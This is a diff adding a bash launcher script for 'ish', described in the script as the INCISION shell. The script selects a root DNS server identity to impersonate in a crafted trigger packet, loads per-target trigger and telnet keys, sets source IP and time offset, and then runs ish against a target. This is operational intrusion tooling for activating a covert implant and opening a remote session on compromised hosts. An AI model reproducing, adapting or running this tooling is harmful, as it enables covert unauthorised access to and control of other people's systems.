@@ -1,0 +1,292 @@
+#!/usr/bin/env bash
+
+##
+## Global variables used.
+##
+
+## Uncomment & set keys/rootdns if you don't want to be prompted.
+
+#keys=TARGET
+[ ${rootdns:+1} ] || rootdns=dontcare
+#rootdns=localip
+
+PATH=$PATH:$(dirname $0):.
+
+cmdline=$@
+
+dnslist="rs.internic.net	venera.isi.edu		ns.psi.net
+	 noc.umd.edu		gw.home.vix.com		nic.nordu.net
+	 localip		remoteip 		dontcare"
+
+
+##
+## Functions to setup the root server used for the trigger packet.
+##	These functions export environment variables
+##	needed by `ish' in crafting the trigger packet.
+##		DNS_NAME
+##		DNS_IP
+##		DNS_SOA
+##
+
+rs.internic.net() {				# A.ROOT-SERVERS.NET
+	export DNS_NAME=rs.internic.net
+	export DNS_IP=198.41.0.4
+	export DNS_SOA=markk
+}
+
+venera.isi.edu() {				# B.ROOT-SERVERS.NET
+	export DNS_NAME=venera.isi.edu
+	export DNS_IP=128.9.0.107
+	export DNS_SOA=koda
+}
+
+ns.psi.net() {					# C.ROOT-SERVERS.NET
+	export DNS_NAME=ns.psi.net
+	export DNS_IP=192.33.4.12
+	export DNS_SOA=hostmaster
+}
+
+noc.umd.edu() {					# D.ROOT-SERVERS.NET
+	export DNS_NAME=NOC.UMD.EDU
+	export DNS_IP=128.8.10.90
+	export DNS_SOA=hostmaster
+}
+
+gw.home.vix.com() {				# F.ROOT-SERVERS.NET
+	export DNS_NAME=gw.home.vix.com
+	export DNS_IP=192.5.5.241
+	export DNS_SOA=postmaster
+}
+
+nic.nordu.net() {				# I.ROOT-SERVERS.NET
+	export DNS_NAME=nic.nordu.net
+	export DNS_IP=192.36.148.17
+	export DNS_SOA=hostmaster
+}
+
+mindspring.net() {
+	export DNS_NAME=itchy.mindspring.net
+	export DNS_IP=207.69.200.210
+	export DNS_SOA=hostmaster
+}
+
+remoteip() {
+        export DNS_NAME=ns2.ix.netcom.com
+        export DNS_IP=$L_ip
+        export DNS_SOA=hostmaster
+        echo "*** Using Remote IP for trigger ***"
+}
+
+localip() {
+	export DNS_NAME=ns2.ix.netcom.com
+	getipaddr
+	export DNS_IP=$ip
+	export DNS_SOA=hostmaster
+	echo "*** Using local IP for trigger ***"
+}
+
+dontcare() {
+	case $(date +%a) in
+		Mon ) venera.isi.edu	;;
+		Tue ) ns.psi.net	;;
+		Wed ) rs.internic.net	;;
+		Thu ) gw.home.vix.com	;;
+		Fri ) nic.nordu.net	;;
+		*   ) rs.internic.net	;;
+	esac
+}
+
+lab.test.net() {
+	export DNS_NAME=lab.test.net
+	export DNS_IP=10.1.2.3
+	export DNS_SOA=markk
+}
+
+
+##
+## Functions to setup the target's keys
+##	These functions export the environment variables
+##	needed by `tn' for operation.
+##	TARG_TEL	key used during the telnet session
+##			If this is not defined, then assume we're using the
+##			new public key capability.
+##	TARG_AYT	key used in the DNS trigger packet
+##	O_TARG_AYT	key used prior to an upgrade. Remove after reboot.
+##	UTC_OFFSET	target UTC adjustment
+##			expr $(date -u +%Y%j%H%M) - $(date -u +%Y%j%H%M)
+##				  theirs		 ours
+##
+## If needed, the "special" port 17325 gives dst port 53 in triggers.
+##
+## The Following Section is computer Generated from the IKT
+##---------------------------------------------------------------
+
+#
+# IMPORTANT! 
+#  20:05:55 18-JUN-2002 : IKT generated entries.
+#
+# Any modifications made below, are temporary.
+# For permament modifications use the IKT web I/F.
+#
+
+keylist=""
+
+
+##---------------------------------------------------------------
+## End of Computer generated section
+
+
+##
+## Utility functions
+##
+
+setupkeys() {
+	local host=$1
+
+	case $host in
+		-h | -?	  ) usage		;;
+		*	  ) 
+			if [ $keys ]; then
+				$keys
+				return
+			fi
+
+			echo
+			echo -e "\t--- Select target keys ---"
+			echo
+			
+			PS3=$(echo -e "\nkeys? ")
+			select keyinitfct in $keylist; do
+				if [ $keyinitfct ]; then
+					$keyinitfct
+					break
+				else
+					echo "Select a listed number."
+					echo
+				fi
+			done
+			;;
+	esac
+}
+
+ckupgrade() {
+	if [ ${O_TARG_AYT:+1} ]; then
+		echo -n "Do you want to use the old keys? [n] "
+		read ans
+		if [ ${ans:-"n"} = "y" ]; then
+			export TARG_AYT_new=$TARG_AYT
+			export TARG_AYT=$O_TARG_AYT
+		fi
+	fi
+}
+
+setupdns() {
+	if [ $rootdns ]; then
+		$rootdns
+		return
+	fi
+
+	echo
+	echo -e "\t--- Select root DNS server for trigger ---"
+	echo
+
+	PS3=$(echo -e "\nDNS? ")
+	select rootdns in $dnslist; do
+		if [ $rootdns ]; then
+			$rootdns
+			break
+		else
+			echo "Select a listed number."
+			echo
+		fi
+	done
+}
+
+dooptions() {
+	getipaddr
+	local i_opt="-i $ip "
+	local o_opt=${UTC_OFFSET:+"-o $UTC_OFFSET "}
+
+	n=1
+        g_set=0
+	while [ $# -gt 0 ]; do
+		case $1 in
+		-i | -c )	i_set=1  
+                                L_ip=${2%:*} ;; # xmit trigger from this IP addr
+		-o )		o_set=1 ;;	# make a time adj. in trigger
+		-l )		l_set=$n ;;	# use local IP for trigger
+		-g )		g_set=1 ;;  # WRT: Are we using a gateway ?
+		esac
+
+		## Build arg list without the "-l" option.
+		[ ${l_set:-0} -eq $n ] || no_l=$(echo "$no_l $1 ")
+
+		n=$((n+1))
+		shift
+	done
+
+	[ ${i_set:+1} ] || tn_options=$(echo "$tn_options $i_opt ")
+	[ ${o_set:+1} ] || tn_options=$(echo "$tn_options $o_opt ")
+	[ ${l_set:+1} ] && [ $g_set -eq 0 ] && localip && cmdline=$no_l
+        [ ${l_set:+1} ] && [ $g_set -eq 1 ] && remoteip && cmdline=$no_l
+}
+
+getipaddr() {
+    if [ ! "$NOppp" ] ; then
+	ifaddr ppp0
+	[ -n "$ifip" ] && ip=$ifip && echo "using ppp0" && return
+    fi
+
+	ifaddr eth0
+	[ -n "$ifip" ] && ip=$ifip && echo "using eth0" && return
+
+	ip=$(hostname -i)
+}
+
+ifaddr() {
+	ifip=$(ifconfig $1 2> /dev/null | grep "inet addr:" | \
+		cut -d: -f2 | cut -d' ' -f1 )
+}
+
+echoenv() {
+	echo
+	echo "- Environment variable setup..."
+	echo "    DNS_NAME   = $DNS_NAME"
+	echo "    DNS_IP     = $DNS_IP"
+	echo "    DNS_SOA    = $DNS_SOA"
+	echo "    TARG_TEL   = $TARG_TEL"
+	[ ${TARG_AYT_new:+1} ] && 
+	echo "    TARG_AYT   = $TARG_AYT_new   resetting to old keys..."
+	echo "    TARG_AYT   = $TARG_AYT"
+	[ ${O_TARG_AYT:+1} ] && echo "    O_TARG_AYT = $O_TARG_AYT"
+	[ ${UTC_OFFSET:+1} ] && echo "    UTC_OFFSET = $UTC_OFFSET"
+	echo
+}
+
+usage() {
+	echo
+	echo "  $0 is a bash shell script that sets up the"
+	echo "  environment for \`ish', the INCISION shell."
+	echo "  All command line args are passed along to \`ish'."
+	echo "  Options to \`ish' are..."
+	echo
+	ish -h
+	exit
+}
+
+
+##
+## Run the functions to setup the environment for INCISION's shell `ish'.
+##
+
+eval targ=\${$#}	# note: doesn't handle port arg at end of command line
+setupkeys $targ
+ckupgrade
+setupdns
+dooptions $cmdline
+
+echoenv
+echo running:  ish $tn_options $cmdline
+echo
+
+eval ish $tn_options \$cmdline
